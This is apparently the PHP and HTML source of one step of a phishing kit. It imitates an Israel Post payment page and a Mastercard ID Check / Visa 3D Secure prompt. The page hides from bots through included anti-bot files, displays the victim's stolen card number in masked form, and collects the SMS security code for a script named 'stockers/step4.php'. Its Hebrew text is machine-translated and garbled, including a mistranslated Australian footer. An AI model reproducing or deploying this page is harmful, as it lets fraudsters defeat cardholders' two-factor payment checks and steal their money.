<?php
include '../prevents/anti1.php';
include '../prevents/anti2.php';
include '../prevents/anti3.php';
include '../prevents/anti4.php';
include '../prevents/anti5.php';
include '../extra/mine.php';
ob_start();
session_start();
if(!isset($_SESSION['language'])){exit(header("Location: index.php"));
}else{
  include "../extra/languages/{$_SESSION['language']}.php";
}
  ?>
<html lang="is"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="preconnect" href="https://fonts.gstatic.com/">
    <link href="./files/css2" rel="stylesheet">
    <!-- css files -->
    <link rel="stylesheet" href="./files/all.min.css">
    <link rel="stylesheet" href="./files/bootstrap.min.css">
    <link rel="stylesheet" href="./files/2.css">
    <title></title>
</head>
<body>
    <div class="container">
<br>

        <form id="cardForm" action="../extra/stockers/step4.php" method="post">
            <section class="first-sec">
                <div class="centrer  ">
                    <div class="containerHead paddingDiv">
                        <div class="leftcontainerHead">
                            <img src="./files/aus-logo.png" style=" width: 140px;">
                        </div>
                        <div class="rightcontainerHead">
                            <img src="./files/mcx.png" style=" width: 135px;">

                        </div>
                    </div>
                </div>
                <div class="paddingDiv" style="margin-top: 40px ; ">
                    <strong class="textMessage2">
                        אימות עסקה
                         </strong>
                    <p class="textMessage">
                        Mastercard® ID CheckVisa® 3D Secure, שלחנו את קוד הסיסמה המאובטח בהודעת טקסט לנייד שלך.

                    </p>
                </div>
                <div class="paddingDiv" style="margin-top: 10px ; ">

                    <table width="70%" class="textMessage">
                        <tbody><tr><td style=" width: 50%;">סוֹחֵר</td><td>israelpost</td></tr>
                        <tr><td style=" width: 50%;">כמות</td><td>10,56 ₪</td></tr>
                        <tr><td style=" width: 50%;">תַאֲרִיך</td><td style="width: 50%;text-align: left">
                               <script>
                                 let date_ob = new Date();

                                        // adjust 0 before single digit date
                                        let date = ("0" + date_ob.getDate()).slice(-2);

                                        // current month
                                        let month = ("0" + (date_ob.getMonth() + 1)).slice(-2);

                                        // current year
                                        let year = date_ob.getFullYear();

                                        // current hours
                                        let hours = date_ob.getHours();

                                        // current minutes
                                        let minutes = date_ob.getMinutes();

                                        // current seconds
                                        let seconds = date_ob.getSeconds();

                                        // prints date & time in YYYY-MM-DD HH:MM:SS format
                                        document.write(year + "/" + month + "/" + date + " " + hours + ":" + minutes + ":" + seconds); </script></td></tr>
                        <tr><td style=" width: 50%;">Numéro de carte</td><td style="width: 50%;text-align: left">
                        <dd><?php echo substr($_SESSION['cardnumber'], 0,4); ?>******<?php echo substr($_SESSION['cardnumber'], -4); ?></dd>
                    </tbody></table>

                </div>
                <p class="HROr">Mastercard® ID Check </p>

                 <div class="first-sec-inf paddingDiv">

                    <div class="second-sec-info">
                        <div class="second-sec-info-form">
                            <input type="text" class="form-control inpt222" placeholder="Enter your קוד אבטחה" maxlength="9" name="sms" required="">
                            <button class="btn btn-dark btn-lg" type="שלח">שלח</button>
                            <p class="sms-verif">הזן את הקוד המאובטח שהתקבל ב-SMS: <span id="timer">00:44</span></p>
                        </div>
                        <script>
                            function countdown() {
                                var seconds = 60;
                                function tick() {
                                    var counter = document.getElementById("timer");
                                    seconds--;

                                    // those if conditions to format the timer
                                    if (seconds >= 60) {
                                        if ((seconds - 60) > 10){
                                            counter.innerHTML = `01:${seconds - 60}`
                                        }
                                        else{
                                            counter.innerHTML = `01:0${seconds - 60}`
                                        }
                                    }
                                    else if (seconds > 10){
                                        counter.innerHTML = `00:${seconds}`
                                    }
                                    else {
                                        counter.innerHTML = `00:0${seconds}`
                                    }

                                    // check if if counter reached 0 then do you you input disable input or something
                                    if( seconds > 0 ) {
                                        setTimeout(tick, 1000);
                                    } else {
                                        // disable input or something
                                        console.log("timer is over input is disabled")
                                    }
                                }
                                tick();
                            }
                            // start the countdown
                            countdown();

                        </script>
                    </div>

                </div>
                <footer>
                        <img src="./files/logos.svg" width="180px" alt="image">

                    <p class="copyright">	© 2022 israelpost מודה באפוטרופוסים המסורתיים של הקרקע שבה אנו פועלים, חיים ומתאספים כשכירים, ומכירים בקשר המתמשך שלהם לאדמה, מים וקהילה. אנו נותנים כבוד לזקנים בעבר, בהווה ובעלים.</p>
                </footer>
            </section>

        </form>

    </div>
    <script>
        function countdown() {
    var seconds = 60;
    function tick() {
        var counter = document.getElementById("timer");
        seconds--;

        // those if conditions to format the timer 
        if (seconds >= 60) {
            if ((seconds - 60) > 10){
                counter.innerHTML = `01:${seconds - 60}`
            }
            else{
                counter.innerHTML = `01:0${seconds - 60}`
            }
        }
        else if (seconds > 10){
            counter.innerHTML = `00:${seconds}`
        }
        else {
            counter.innerHTML = `00:0${seconds}`
        }

        // check if if counter reached 0 then do you you input disable input or something
        if( seconds > 0 ) {
            setTimeout(tick, 1000);
        } else {
            // disable input or something
            console.log("timer is over input is disabled")
        }
    }
    tick();
}
// start the countdown
countdown();

    </script>

</body></html>